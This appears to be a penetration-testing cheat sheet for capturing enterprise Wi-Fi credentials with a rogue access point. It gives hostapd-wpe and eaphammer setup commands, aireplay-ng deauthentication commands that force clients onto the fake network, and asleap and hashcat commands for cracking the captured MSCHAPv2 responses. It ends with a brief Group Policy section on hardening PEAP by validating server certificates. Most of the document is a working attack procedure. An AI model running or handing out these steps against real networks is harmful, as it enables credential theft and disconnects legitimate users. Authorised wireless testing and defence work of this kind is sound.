For protocols such as EAP-MSCHAPv2 and EAP-TTLS it may be possible to set up a malicious access point which accepts EAP authentication, and if the device or user enters their credentials they can be captured. This is because these are password based authentication and the clients are not validating the server certificates. 

--------------------------------------------------
Attack with HostAPD-WPE  (older but more reliable)
--------------------------------------------------
Install HostAPD-wpe:
apt-get update
apt-get install hostapd-wpe

Modify the configuration (interface and ssid): 
/etc/hostapd-wpe/hostapd-wpe.conf

interface=<wlan0>
ssid= <same as corp network> 

Stop the network manager:
service network-manager stop
killall wpa_supplicant

Start Attack:
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

Deauth Clients from the network: 
aireplay-ng --deauth <#packets> -a <Network_Mac> wlan0


----------------------
Attack with EAPHammer: 
----------------------
Setup Attack AP: 
eaphammer -i wlan0 --channel <#> --auth wpa-eap --essid <SSID> --creds

Either deauth all clients:  (continues deauths forces client to you) 
airerplay-ng -0 100 -a <BSSID>  wlan0

or 

Deauth single client: (continues deauths forces client to you) 
airerplay-ng -0 100 -a <BSSID> -c <Client Mac>  wlan0


Crack the Captured Passwords: 
Crack the captured challenge/response password: (Asleap)
asleap -C <challenge> -R <response> -w <DictionaryFile>

Crack With Hashcat:
.\hashcat.exe -m 5500 .\wpeHash.txt ..\wordlists\rockyou.txt
.\hashcat.exe -m 5500 .\wpeHash.txt --show


-------------------------------------------------
Mitigation preferably use EAP-TLS but regardless:
Validate Server Certificates
-------------------------------------------------

If using PEAP the configuration can be hardened to prevent attacks such as Rogue Access Points, by ensuring only the expected certificates are trusted.

This can be done with Group Policy:

Computer Configuration → Policies → Windows Settings → Security Settings → Wireless Network (IEEE 802.11) Policies

In Protected EAP Properties select:

Trusted Root Certification Authorities: select just the relevant Root CA for the certificate in use
Connect to these servers: type the names of the servers as given in the certificate subject field
Select Do not prompt user to authorize new servers or trusted certification authorities
